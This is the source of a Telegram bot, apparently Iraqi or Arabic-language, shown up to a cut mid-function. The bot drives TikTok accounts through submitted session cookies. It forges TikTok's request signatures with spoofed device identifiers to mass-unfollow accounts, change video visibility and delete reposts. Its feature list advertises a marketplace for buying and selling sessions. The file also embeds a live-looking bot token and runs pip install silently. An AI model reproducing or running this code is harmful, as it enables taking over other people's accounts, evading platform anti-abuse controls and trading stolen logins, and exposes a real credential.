# ==================== bot.py - النسخة النهائية الكاملة ====================
# كل التحكمات من داخل البوت، المالك يتحكم بكل شيء

import telebot
import requests
import json
import os
import re
import random
import binascii
import uuid
import time
import secrets
import concurrent.futures
import urllib.parse
import threading
import queue
import string
import datetime
import pycountry
import codecs
import asyncio
import aiohttp
import shutil
from io import BytesIO
from time import time as time_time
from collections import defaultdict
from datetime import datetime, timedelta
from telebot.types import MessageEntity, InlineKeyboardMarkup, InlineKeyboardButton
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== تثبيت المكتبات المطلوبة ====================
try:
    from MedoSigner import Argus, Gorgon, Ladon, md5
    MEDOSIGNER_AVAILABLE = True
except:
    MEDOSIGNER_AVAILABLE = False
    os.system('pip install requests MedoSigner')
    try:
        from MedoSigner import Argus, Gorgon, Ladon, md5
        MEDOSIGNER_AVAILABLE = True
    except:
        pass

try:
    from SignerPy import sign, xor, ttencrypt, get
    SIGNERPY_AVAILABLE = True
except:
    SIGNERPY_AVAILABLE = False

# ==================== إعدادات تحمل الضغط ====================
MAX_WORKERS = 100
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3
RETRY_DELAY = 2
BATCH_SIZE = 50
HIGH_PERFORMANCE_MODE = True
MAX_SESSIONS_PER_FILE = 1000

# ==================== Hostnames ====================
Hostnames = [
    "api16-normal-c-alisg.tiktokv.com", "api.tiktokv.com", "api-h2.tiktokv.com",
    "api-va.tiktokv.com", "api16.tiktokv.com", "api16-va.tiktokv.com",
    "api19.tiktokv.com", "api19-va.tiktokv.com", "api21.tiktokv.com",
    "api15-h2.tiktokv.com", "api21-h2.tiktokv.com", "api21-va.tiktokv.com",
    "api22.tiktokv.com", "api22-va.tiktokv.com", "api-t.tiktok.com",
    "api16-normal-baseline.tiktokv.com", "api23-normal-zr.tiktokv.com",
    "api21-normal.tiktokv.com", "api22-normal-zr.tiktokv.com",
    "api33-normal.tiktokv.com", "api31-normal.tiktokv.com",
    "api15-normal.tiktokv.com", "api31-normal-cost-sg.tiktokv.com",
    "api3-normal.tiktokv.com", "api31-normal-zr.tiktokv.com",
    "api9-normal.tiktokv.com", "api16-normal.tiktokv.com",
    "api16-normal-ttapis.com", "api19-normal-zr.tiktokv.com",
    "api16-normal-zr.tiktokv.com", "api16-normal-apix.tiktokv.com",
    "api74-normal.tiktokv.com", "api32-normal-zr.tiktokv.com",
    "api23-normal.tiktokv.com", "api32-normal.tiktokv.com",
    "api16-normal-quic.tiktokv.com", "api-normal.tiktokv.com",
    "api16-normal-apix-quic.tiktokv.com", "api19-normal.tiktokv.com",
    "api31-normal-cost-mys.tiktokv.com", "im-va.tiktokv.com",
    "imapi-16.tiktokv.com", "imapi-16.musical.ly", "imapi-mu.isnssdk.com",
    "api.tiktok.com", "api.ttapis.com", "api.tiktokv.us", "api.tiktokv.eu",
    "api.tiktokw.us", "api.tiktokw.eu", "webcast-ws16-normal-useast5.tiktokv.us",
    "webcast-ws16-normal-useast8.tiktokv.us", "webcast16-normal-useast5.tiktokv.us",
    "webcast16-normal-useast8.tiktokv.us", "webcast19-normal-useast5.tiktokv.us",
    "webcast19-normal-useast8.tiktokv.us", "api.tiktokv.us",
    "api16-core-useast5.tiktokv.us", "api16-core-useast8.tiktokv.us",
    "api16-normal-useast5.tiktokv.us", "api16-normal-useast8.tiktokv.us",
    "api19-core-useast5.tiktokv.us", "api19-core-useast8.tiktokv.us",
    "api19-normal-useast5.tiktokv.us", "api19-normal-useast8.tiktokv.us",
    "ad.tiktokv.us", "tiktokv.us", "tiktokw.us"
]

# ==================== الإعدادات الأساسية ====================
# ⚠️ غير التوكنات هنا أو استخدم متغيرات بيئية
TOKEN = os.environ.get("BOT_TOKEN") or "8719658318:AAGvrd1187_Cjux42sJw6sJiEv08AZ6irCY"
bot = telebot.TeleBot(TOKEN)

ADMIN_ID = 8399798839
ADMIN_IDS = [8399798839, 7627162245]

# ==================== ملفات التخزين ====================
USERS_FILE = "users.txt"
BANNED_FILE = "banned.txt"
VIP_FILE = "vip.txt"
STATS_FILE = "stats.json"
MODE_FILE = "mode2.txt"
CH_FILE = "ch2.txt"
IID_FILE = "iid.txt"
FEATURES_FILE = "features.json"
CREDITS_FILE = "credits.json"
BACKUP_DIR = "backups"

# ==================== المتغيرات العامة ====================
user_states = {}
banned_from_bot = []
mandatory_channels_list = []
custom_messages = []
user_broadcast_limits = {}
temp_data = {}
session_info_data = {}
scraping_tasks = {}
bot_paused = False

# ==================== إيموجيات ====================
emoji1 = '<tg-emoji emoji-id="5258011929993026890">⚡</tg-emoji>'
emoji2 = '<tg-emoji emoji-id="5879831088880161021">🔥</tg-emoji>'
emoji3 = '<tg-emoji emoji-id="5085066469000086268">🏆</tg-emoji>'
emoji4 = '<tg-emoji emoji-id="6037243349675544634">⚡</tg-emoji>'
emoji5 = '<tg-emoji emoji-id="5086917552660022230">🔥</tg-emoji>'
emoji6 = '<tg-emoji emoji-id="5086917552660022230">🏆</tg-emoji>'
emoji7 = '<tg-emoji emoji-id="6008275560495582704">⚡</tg-emoji>'
emoji8 = '<tg-emoji emoji-id="4911225932527698811">🔥</tg-emoji>'
emoji9 = '<tg-emoji emoji-id="5222032585227539319">🏆</tg-emoji>'
emoji10 = '<tg-emoji emoji-id="5303416490295304868">⚡</tg-emoji>'
emoji11 = '<tg-emoji emoji-id="5222032585227539319">🔥</tg-emoji>'
emoji12 = '<tg-emoji emoji-id="5454386656628991407">🔥</tg-emoji>'
emoji13 = '<tg-emoji emoji-id="6037243349675544634">🔥</tg-emoji>'
emoji14 = '<tg-emoji emoji-id="5224705059907995009">🏆</tg-emoji>'
emoji15 = '<tg-emoji emoji-id="5206476089127372379">🏆</tg-emoji>'
emoji16 = '<tg-emoji emoji-id="5382164415019768638">🏆</tg-emoji>'
emoji17 = '<tg-emoji emoji-id="5201873447554145566">🏆</tg-emoji>'
emoji20 = '<tg-emoji emoji-id="5974104203688152439">🏆</tg-emoji>'

emoji_check = '<tg-emoji emoji-id="5807669483619226764">✅</tg-emoji>'
emoji_ban = '<tg-emoji emoji-id="5278753302023004775">❌</tg-emoji>'

start_e1 = '<tg-emoji emoji-id="5400157768189488725">✨</tg-emoji>'
start_e2 = '<tg-emoji emoji-id="6102522317089279591">✅</tg-emoji>'
start_e3 = '<tg-emoji emoji-id="5258331647358540449">✍️</tg-emoji>'
start_e4 = '<tg-emoji emoji-id="6100252568607264352">✅</tg-emoji>'
owner_e1 = '<tg-emoji emoji-id="5258093637450866522">🤖</tg-emoji>'

emoji_username = '<tg-emoji emoji-id="5355194610266158984">👤</tg-emoji>'
emoji_userid = '<tg-emoji emoji-id="5974526806995242353">🆔</tg-emoji>'
emoji_email_f = '<tg-emoji emoji-id="5303416490295304868">📧</tg-emoji>'
emoji_mobile_f = '<tg-emoji emoji-id="5104966345267610825">📱</tg-emoji>'
emoji_verified_f = '<tg-emoji emoji-id="5422348442573749902">✅</tg-emoji>'
emoji_session_f = '<tg-emoji emoji-id="5974475701179387553">🔑</tg-emoji>'
emoji_coin = '<tg-emoji emoji-id="5382164415019768638">💰</tg-emoji>'
emoji_diamond = '<tg-emoji emoji-id="6064387951008156750">💎</tg-emoji>'
emoji_money = '<tg-emoji emoji-id="5201873447554145566">💵</tg-emoji>'

emoji_globe = '<tg-emoji emoji-id="5275979556308674886">🌍</tg-emoji>'
emoji_search = '<tg-emoji emoji-id="5327982530702359565">🔍</tg-emoji>'
emoji_list = '<tg-emoji emoji-id="5222240684982960295">📋</tg-emoji>'
emoji_stop = '<tg-emoji emoji-id="5278753302023004775">🛑</tg-emoji>'
emoji_lock = '<tg-emoji emoji-id="5974475701179387553">🔒</tg-emoji>'
emoji_download = '<tg-emoji emoji-id="5327982530702359565">📥</tg-emoji>'
emoji_users = '<tg-emoji emoji-id="5086917552660022230">👥</tg-emoji>'

# ==================== دوال الملفات ====================
def init_db():
    files = [USERS_FILE, BANNED_FILE, VIP_FILE, 'id.txt']
    for f in files:
        if not os.path.exists(f): 
            open(f, "w").close()
    if not os.path.exists(STATS_FILE): 
        json.dump({"valid": 0, "invalid": 0, "is_bot_active": True}, open(STATS_FILE, "w"))
    if not os.path.exists(MODE_FILE): 
        open(MODE_FILE, 'w').write('public')
    if not os.path.exists(CH_FILE): 
        open(CH_FILE, 'w').close()
    if not os.path.exists(IID_FILE): 
        open(IID_FILE, 'w').write("7427048691142395393:7574913218801157889")
    if not os.path.exists(FEATURES_FILE):
        json.dump({}, open(FEATURES_FILE, 'w'))
    if not os.path.exists(CREDITS_FILE):
        json.dump({}, open(CREDITS_FILE, 'w'))
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

init_db()

# ==================== نظام الميزات ====================
AVAILABLE_FEATURES = {
    "auto_backup": {"name": "نسخ احتياطي تلقائي", "description": "ينسخ السيشنات كل ساعة", "enabled": False},
    "account_analysis": {"name": "تحليل الحساب", "description": "يحلل أداء الحساب ويعطيك تقرير", "enabled": False},
    "smart_follow": {"name": "متابعة تلقائية ذكية", "description": "يتابع حسابات نشطة في مجالك", "enabled": False},
    "auto_engagement": {"name": "إعجاب وتعليق تلقائي", "description": "يتفاعل مع فيديوهات حسب هاشتاجات", "enabled": False},
    "smart_delete": {"name": "حذف فيديوهات متقدم", "description": "يحذف فيديوهات حسب معايير محددة", "enabled": False},
    "currency_converter": {"name": "تحويل العملات", "description": "يحول Coins إلى دولار وعملات محلية", "enabled": False},
    "account_monitor": {"name": "مراقبة الحساب", "description": "يراقب الحساب 24 ساعة", "enabled": False},
    "download_videos": {"name": "تحميل فيديوهات", "description": "يحمل فيديوهات TikTok بجودة عالية", "enabled": False},
    "session_marketplace": {"name": "سوق السيشنات", "description": "يبيع ويشتري السيشنات", "enabled": False},
    "competitor_analysis": {"name": "تحليل المنافسين", "description": "يحلل حسابات منافسين", "enabled": False},
    "credits_system": {"name": "نظام الكريدت", "description": "نقاط تكسبها من العمليات الناجحة", "enabled": False},
    "task_scheduler": {"name": "جدولة المهام", "description": "يجدول مهام تلقائية", "enabled": False},
    "daily_report": {"name": "تقرير يومي", "description": "يرسل تقرير يومي للمالك", "enabled": False},
    "auto_bio": {"name": "تغيير البايو تلقائي", "description": "يغير البايو في أوقات محددة", "enabled": False},
    "import_export": {"name": "استيراد وتصدير", "description": "يستورد ويصدر البيانات بصيغ مختلفة", "enabled": False},
    "fake_detector": {"name": "كشف الحسابات المزيفة", "description": "يكتشف المتابعين الوهميين", "enabled": False},
    "auto_update": {"name": "تحديث تلقائي", "description": "يحدث المكتبات والدومينات", "enabled": False},
}

def load_features():
    if os.path.exists(FEATURES_FILE):
        try:
            with open(FEATURES_FILE, 'r') as f:
                data = json.load(f)
                # دمج مع الميزات الجديدة
                for key in AVAILABLE_FEATURES:
                    if key not in data:
                        data[key] = AVAILABLE_FEATURES[key].copy()
                        data[key]['enabled'] = False
                return data
        except:
            return AVAILABLE_FEATURES.copy()
    return AVAILABLE_FEATURES.copy()

def save_features(features):
    with open(FEATURES_FILE, 'w') as f:
        json.dump(features, f, indent=4)

def toggle_feature(feature_name):
    features = load_features()
    if feature_name in features:
        features[feature_name]['enabled'] = not features[feature_name]['enabled']
        save_features(features)
        return features[feature_name]['enabled']
    return None

def get_enabled_features():
    features = load_features()
    return [name for name, data in features.items() if data.get('enabled', False)]

def get_feature_status(feature_name):
    features = load_features()
    if feature_name in features:
        return features[feature_name].get('enabled', False)
    return False

# ==================== نظام الكريدت ====================
def load_credits():
    if os.path.exists(CREDITS_FILE):
        try:
            with open(CREDITS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_credits(credits):
    with open(CREDITS_FILE, 'w') as f:
        json.dump(credits, f, indent=4)

def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)
    credits[user_id] = credits.get(user_id, 0) + amount
    save_credits(credits)
    return credits[user_id]

def remove_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)
    current = credits.get(user_id, 0)
    credits[user_id] = max(0, current - amount)
    save_credits(credits)
    return credits[user_id]

def get_credits(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

# ==================== دوال النسخ الاحتياطي ====================
def auto_backup():
    try:
        if not os.path.exists(BACKUP_DIR):
            os.makedirs(BACKUP_DIR)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = f"{BACKUP_DIR}/sessions_backup_{timestamp}.txt"
        
        if os.path.exists('id.txt'):
            with open('id.txt', 'r') as f:
                data = f.read()
            with open(backup_file, 'w') as f:
                f.write(data)
        
        # نسخ ملفات مهمة أخرى
        for file in [USERS_FILE, VIP_FILE, BANNED_FILE, STATS_FILE, CREDITS_FILE, FEATURES_FILE]:
            if os.path.exists(file):
                shutil.copy2(file, f"{BACKUP_DIR}/{file}.{timestamp}.bak")
        
        # حذف النسخ القديمة (احتفظ بآخر 10)
        backups = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith('sessions_backup_')])
        while len(backups) > 10:
            os.remove(os.path.join(BACKUP_DIR, backups.pop(0)))
            
    except Exception as e:
        print(f"خطأ في النسخ الاحتياطي: {e}")

def start_auto_backup():
    def backup_loop():
        while True:
            time.sleep(3600)  # كل ساعة
            if get_feature_status("auto_backup"):
                auto_backup()
    thread = Thread(target=backup_loop, daemon=True)
    thread.start()

# ==================== دوال التقرير اليومي ====================
def generate_daily_report():
    stats = get_stats()
    total_users = count_subscribers()
    vip_count = len(get_all_vip())
    credits = load_credits()
    total_credits = sum(credits.values())
    
    report = f"<b>📊 التقرير اليومي</b>\n\n"
    report += f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
    report += f"{'━'*30}\n"
    report += f"👥 المشتركين: {total_users}\n"
    report += f"👑 VIP: {vip_count}\n"
    report += f"🚫 المحظورين: {len(banned_from_bot)}\n"
    report += f"{'━'*30}\n"
    report += f"✅ صالحة: {stats.get('valid', 0)}\n"
    report += f"❌ فاشلة: {stats.get('invalid', 0)}\n"
    report += f"💎 الكريدت: {total_credits:,}\n"
    report += f"{'━'*30}\n"
    
    enabled = get_enabled_features()
    if enabled:
        report += f"⚙️ الميزات المفعلة:\n"
        for name in enabled:
            report += f"  • {AVAILABLE_FEATURES[name]['name']}\n"
    
    return report

def start_daily_report():
    def report_loop():
        while True:
            now = datetime.now()
            midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
            wait_seconds = (midnight - now).total_seconds()
            time.sleep(wait_seconds)
            
            if get_feature_status("daily_report"):
                report = generate_daily_report()
                for admin_id in ADMIN_IDS:
                    try:
                        bot.send_message(admin_id, report, parse_mode="HTML")
                    except:
                        pass
    thread = Thread(target=report_loop, daemon=True)
    thread.start()

# ==================== دوال المساعدة الأساسية ====================
def get_mode():
    try:
        with open(MODE_FILE, "r") as file:
            mode = file.read().strip()
        return mode if mode in ['private', 'public'] else 'public'
    except:
        return 'public'

def toggle_mode():
    new_mode = 'private' if get_mode() == 'public' else 'public'
    with open(MODE_FILE, "w") as file:
        file.write(new_mode)
    return new_mode

def translate_mode(mode):
    return "مدفوع" if mode == "private" else "مجاني"

def count_subscribers():
    try:
        return sum(1 for line in open('id.txt', 'r', encoding='utf-8') if line.strip())
    except:
        return 0

def save_user_and_notify(user):
    user_id = str(user.id)
    with open(USERS_FILE, "r") as f:
        users = f.read().splitlines()
    if user_id not in users:
        with open(USERS_FILE, "a") as f:
            f.write(user_id + "\n")
        total_users = len(users) + 1
        first_name = user.first_name if user.first_name else "لا يوجد"
        username = f"@{user.username}" if user.username else "لا يوجد"
        notify_msg = f"<b>⇜ دخـل شخـص إلى البـوت\n⇜ إسمـه ⇜ ⦓{first_name}⦔\n⇜ ايديـه ⇜ <code>{user.id}</code>\n⇜ معرفـه ⇜ {username}\n⇜ الإحصـائيات ⇜ {total_users}</b>"
        try:
            bot.send_message(ADMIN_ID, notify_msg, parse_mode="HTML")
        except:
            pass
    with open('id.txt', 'r') as file:
        read = file.read().splitlines()
    if user_id not in read:
        open('id.txt', 'a').write(user_id + '\n')

def notify_action(user, action_name="فحص سيشن"):
    first_name = user.first_name if user.first_name else "لا يوجد"
    username = f"@{user.username}" if user.username else "لا يوجد"
    notify_msg = f"<b>⇜ شخص اختـر خدمة\n⇜ إسمـه ⇜ {first_name}\n⇜ ايديـه ⇜ <code>{user.id}</code>\n⇜ معرفـه ⇜ {username}\n⇜ الخدمة ⇜ {action_name}</b>"
    try:
        bot.send_message(ADMIN_ID, notify_msg, parse_mode="HTML")
    except:
        pass

def is_banned(user_id):
    if user_id in banned_from_bot:
        return True
    with open(BANNED_FILE, "r") as f:
        banned = f.read().splitlines()
    return str(user_id) in banned

def is_vip(user_id):
    if user_id in ADMIN_IDS:
        return True
    try:
        with open(VIP_FILE, "r") as f:
            vip_list = f.read().splitlines()
        return str(user_id) in vip_list
    except:
        return False

def get_all_vip():
    try:
        return [line.strip() for line in open("vip.txt", "r") if line.strip()]
    except:
        return []

def get_stats():
    try:
        with open(STATS_FILE, "r") as f:
            data = json.load(f)
        if 'is_bot_active' not in data:
            data['is_bot_active'] = True
        if 'valid' not in data:
            data['valid'] = 0
        if 'invalid' not in data:
            data['invalid'] = 0
        return data
    except:
        return {"valid": 0, "invalid": 0, "is_bot_active": True}

def update_stats(key, toggle=False):
    data = get_stats()
    if toggle:
        data[key] = not data[key]
    else:
        data[key] = data.get(key, 0) + 1
    with open(STATS_FILE, "w") as f:
        json.dump(data, f)

def load_mandatory_channels():
    global mandatory_channels_list
    mandatory_channels_list = []
    if os.path.exists(CH_FILE):
        with open(CH_FILE, "r") as f:
            for line in f:
                if line.strip():
                    mandatory_channels_list.append(line.strip())
load_mandatory_channels()

def save_mandatory_channels():
    open(CH_FILE, "w").write("\n".join(mandatory_channels_list) + "\n")

def check_mandatory_subscription(message):
    user_id = message.from_user.id
    if user_id in ADMIN_IDS:
        return True
    if not mandatory_channels_list:
        return True
    for entity in mandatory_channels_list:
        try:
            status = bot.get_chat_member(entity, user_id).status
            if status in ['left', 'kicked']:
                send_force_subscribe(message.chat.id)
                return False
        except:
            continue
    return True

def check_user_access(msg):
    user_id = msg.from_user.id
    if is_banned(user_id):
        bot.send_message(msg.chat.id, f"<b>{emoji_ban} تم حظرك من استخدام البوت.</b>", parse_mode="HTML")
        return False
    stats = get_stats()
    if not stats.get("is_bot_active", True) and not is_vip(user_id):
        bot.send_message(msg.chat.id, "<b>⚠️ البوت قيد الصيانة</b>", parse_mode="HTML")
        return False
    return True

def verify_access(message):
    user_id_bot = message.chat.id
    if user_id_bot in ADMIN_IDS:
        return "admin"
    mode = get_mode()
    try:
        with open('vip.txt', 'r') as f:
            subscribed_users = f.read().splitlines()
    except:
        subscribed_users = []
    if mode == "public":
        return "done"
    elif mode == "private":
        return "done" if str(user_id_bot) in subscribed_users else "not premium"
    return "not premium"

def send_force_subscribe(chat_id):
    kb = InlineKeyboardMarkup(row_width=1)
    if mandatory_channels_list:
        for channel in mandatory_channels_list:
            clean_channel = channel.replace('@', '').strip()
            kb.add(InlineKeyboardButton(f"اشترك في {channel}", url=f"https://t.me/{clean_channel}"))
    kb.add(InlineKeyboardButton("تم الاشتراك، تحقق الان", callback_data="check_subscription_click"))
    channels_text = "\n".join([f"• {ch}" for ch in mandatory_channels_list])
    bot.send_message(chat_id, f"<b>{emoji4} عذراً، يجب الاشتراك في:\n\n{channels_text}\n\nاشترك ثم اضغط تحقق</b>", reply_markup=kb, parse_mode="HTML")

# ==================== كلاس DEMO ====================
class DEMO:
    def __init__(self, ses, hh):
        self.sessionid = ses
        self.hh = hh
        self.a = 0
        self.b = 0

    def Vals(self):
        return {
            "manifest_version_code": "330802",
            "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            "app_language": "ar",
            "app_type": "normal",
            "iid": str(random.randint(1, 10**19)),
            "channel": "googleplay",
            "device_type": "RMX3511",
            "language": "ar",
            "host_abi": "arm64-v8a",
            "locale": "ar",
            "resolution": "1080*2236",
            "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
            "update_version_code": "330802",
            "ac2": "lte",
            "cdid": str(uuid.uuid4()),
            "sys_region": "IQ",
            "os_api": "33",
            "timezone_name": "Asia/Baghdad",
            "dpi": "360",
            "carrier_region": "IQ",
            "ac": "4g",
            "device_id": str(random.randint(1, 10**19)),
            "os_version": "13",
            "timezone_offset": "10800",
            "version_code": "330802",
            "app_name": "musically_go",
            "ab_version": "33.8.2",
            "version_name": "33.8.2",
            "device_brand": "realme",
            "op_region": "IQ",
            "ssmix": "a",
            "device_platform": "android",
            "build_number": "33.8.2",
            "region": "IQ",
            "aid": "1340",
            "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1)
        }, {
            'Cookie': 'sessionid=' + self.sessionid,
            'User-Agent': 'com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)'
        }

    def sign(self, params, payload=None, sec_device_id="", cookie=None, aid=1233, license_id=1611921764, sdk_version_str="2.3.1.i18n", sdk_version=2, platform=19, unix=None):
        if not MEDOSIGNER_AVAILABLE:
            return {}
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
        if not unix:
            unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | {
            "x-ladon": Ladon.encrypt(unix, license_id, aid),
            "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
        }

    def login_sessionid(self):
        p, h = self.Vals()
        h.update({'Host': 'api16-normal-c-alisg.tiktokv.com'})
        try:
            ress = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?{urllib.parse.urlencode(p)}', headers=h)
            if 'user_id' in ress.text:
                id = ress.json()["data"]["user_id"]
                return None if id == 0 else id
            return None
        except:
            return None

    def get_id_to_unfollow(self):
        id = self.login_sessionid()
        if not id:
            return []
        p, h = self.Vals()
        m = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        response = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/following/list/?offset=0&user_id={id}&count=50&source_type=1&max_time=0&request_tag_from=h5&{urllib.parse.urlencode(p)}', headers=h)
        return re.findall(r'"uid":"(\d+)"', response.text)

    def un_follow(self, idd):
        p, h = self.Vals()
        p.update({"user_id": str(idd), "type": "0", "from": "19", "from_page": "others_homepage"})
        m = self.sign(urllib.parse.urlencode(p), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(9)), None, 1340)
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        requests.get(f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/follow/?{urllib.parse.urlencode(p)}', headers=h)

    def get_id_to_private(self):
        id = self.login_sessionid()
        if not id:
            return []
        p, h = self.Vals()
        m = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        response = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/public/item/list/?source=0&max_cursor=0&cursor=0&user_id={id}&count=50&filter_private=1&{urllib.parse.urlencode(p)}', headers=h)
        return re.findall(r'"statistics"\s*:\s*{\s*"aweme_id"\s*:\s*"(\d+)"', response.text)

    def private_video(self, idd):
        p, h = self.Vals()
        m = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        requests.get(f'https://api16-normal-c-alisg.tiktokv.com/aweme/v1/aweme/modify/visibility/?aweme_id={idd}&type=2&{urllib.parse.urlencode(p)}', headers=h)

    def get_id_to_public(self):
        id = self.login_sessionid()
        if not id:
            return []
        p, h = self.Vals()
        m = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        response = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/private/item/list/?max_cursor=0&count=9999&{urllib.parse.urlencode(p)}', headers=h)
        return re.findall(r'"statistics"\s*:\s*{\s*"aweme_id"\s*:\s*"(\d+)"', response.text)

    def public_video(self, idd):
        p, h = self.Vals()
        m = self.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        requests.get(f'https://api16-normal-c-alisg.tiktokv.com/aweme/v1/aweme/modify/visibility/?aweme_id={idd}&type=1&{urllib.parse.urlencode(p)}', headers=h)

    def get_id_to_repost(self):
        id = self.login_sessionid()
        if not id:
            return []
        h = self.Vals()[1]
        url = "https://api22-normal-c-alisg.tiktokv.com/tiktok/v1/upvote/item/list?user_id="+str(id)+"&offset=0&count=21&scene=0&iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=mobile&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=lte&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+""
        m = self.sign(params=(url.split('scene=0&')[1]), payload="", cookie="")
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        response = requests.get(url, headers=h)
        return re.findall(r'"statistics"\s*:\s*{\s*"aweme_id"\s*:\s*"(\d+)"', response.text)

    def cancel_repost(self, idd):
        h = self.Vals()[1]
        url = "https://api22-normal-c-alisg.tiktokv.com/tiktok/v1/upvote/delete?item_id="+str(idd)+"&iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+""
        m = self.sign(url.split("delete?")[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(9)), None, 1340)
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        })
        requests.post(url, headers=h)

    def get_id_to_Favo(self):
        id = self.login_sessionid()
        if not id:
            return []
        h = self.Vals()[1]
